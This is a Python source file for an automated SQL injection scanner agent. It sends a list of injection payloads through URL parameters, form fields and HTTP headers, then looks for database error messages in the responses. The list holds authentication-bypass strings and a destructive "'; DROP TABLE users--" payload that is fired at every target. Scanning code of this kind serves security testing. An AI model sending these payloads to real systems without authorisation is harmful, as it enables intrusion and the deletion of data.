"""
SQL Injection detection agent
"""

import asyncio
from typing import List, Dict, Any
import httpx
from itzraven.agents.base_agent import BaseAgent, AgentResult, Finding, AgentStatus
from itzraven.core.logger import get_logger

logger = get_logger()


class SQLInjectionAgent(BaseAgent):
    """Agent for detecting SQL injection vulnerabilities"""

    def __init__(self, target: str, event_bus=None, memory_manager=None):
        super().__init__("SQL Injection Agent", target, event_bus=event_bus, memory_manager=memory_manager)
        self.payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            "' UNION SELECT NULL--",
            "' AND 1=1--",
            "' AND 1=2--",
            "1' ORDER BY 1--",
            "1' ORDER BY 100--",
            "' WAITFOR DELAY '0:0:5'--",
            "'; DROP TABLE users--",
        ]

    async def execute(self) -> AgentResult:
        """Execute SQL injection testing"""
        logger.info(f"{self.name}: Testing {self.target}")

        # Test GET parameters
        await self._test_get_parameters()

        # Test POST parameters
        await self._test_post_parameters()

        # Test headers
        await self._test_headers()

        await self._run_nuclei_tags(tags=["sql-injection", "sqli", "error-sql"], severity="high")

        return AgentResult(
            agent_name=self.name,
            status=self.status,
            findings=self.findings,
            execution_time=0,
        )

    async def _test_get_parameters(self) -> None:
        """Test GET parameters for SQL injection"""
        async with httpx.AsyncClient(timeout=10.0) as client:
            for test_url in self.get_test_urls():
                for payload in self.payloads:
                    try:
                        # Test common parameter names
                        params = {"id": payload, "user": payload, "search": payload}
                        response = await client.get(test_url, params=params)

                        # Check for SQL error messages
                        if self._detect_sql_error(response.text):
                            self.add_finding(Finding(
                                title="SQL Injection in GET parameter",
                                description=f"SQL injection detected with payload: {payload}",
                                severity="critical",
                                category="injection",
                                evidence=f"Response contains SQL error. Status: {response.status_code}",
                                proof_of_concept=f"GET {test_url}?id={payload}",
                                remediation="Use parameterized queries and input validation",
                                confidence=0.9,
                            ))
                            break

                    except Exception as e:
                        logger.debug(f"Error testing GET: {e}")

    async def _test_post_parameters(self) -> None:
        """Test POST parameters for SQL injection"""
        async with httpx.AsyncClient(timeout=10.0) as client:
            for test_url in self.get_test_urls():
                for payload in self.payloads:
                    try:
                        data = {"username": payload, "password": payload}
                        response = await client.post(test_url, data=data)

                        if self._detect_sql_error(response.text):
                            self.add_finding(Finding(
                                title="SQL Injection in POST parameter",
                                description=f"SQL injection detected with payload: {payload}",
                                severity="critical",
                                category="injection",
                                evidence=f"Response contains SQL error. Status: {response.status_code}",
                                proof_of_concept=f"POST {test_url} with data: {data}",
                                remediation="Use parameterized queries and input validation",
                                confidence=0.9,
                            ))
                            break

                    except Exception as e:
                        logger.debug(f"Error testing POST: {e}")

    async def _test_headers(self) -> None:
        """Test HTTP headers for SQL injection"""
        async with httpx.AsyncClient(timeout=10.0) as client:
            for test_url in self.get_test_urls():
                for payload in self.payloads[:3]:  # Test fewer payloads for headers
                    try:
                        headers = {
                            "User-Agent": payload,
                            "X-Forwarded-For": payload,
                            "Referer": payload,
                        }
                        response = await client.get(test_url, headers=headers)

                        if self._detect_sql_error(response.text):
                            self.add_finding(Finding(
                                title="SQL Injection in HTTP header",
                                description=f"SQL injection detected in headers with payload: {payload}",
                                severity="high",
                                category="injection",
                                evidence=f"Response contains SQL error. Status: {response.status_code}",
                                proof_of_concept=f"GET {test_url} with malicious headers",
                                remediation="Sanitize all user input including HTTP headers",
                                confidence=0.85,
                            ))
                            break

                    except Exception as e:
                        logger.debug(f"Error testing headers: {e}")

    def _detect_sql_error(self, response_text: str) -> bool:
        """Detect SQL error messages in response"""
        sql_errors = [
            "sql syntax",
            "mysql_fetch",
            "mysql error",
            "postgresql error",
            "ora-",
            "sqlite_",
            "sqlstate",
            "syntax error",
            "unclosed quotation mark",
            "quoted string not properly terminated",
        ]

        response_lower = response_text.lower()
        return any(error in response_lower for error in sql_errors)
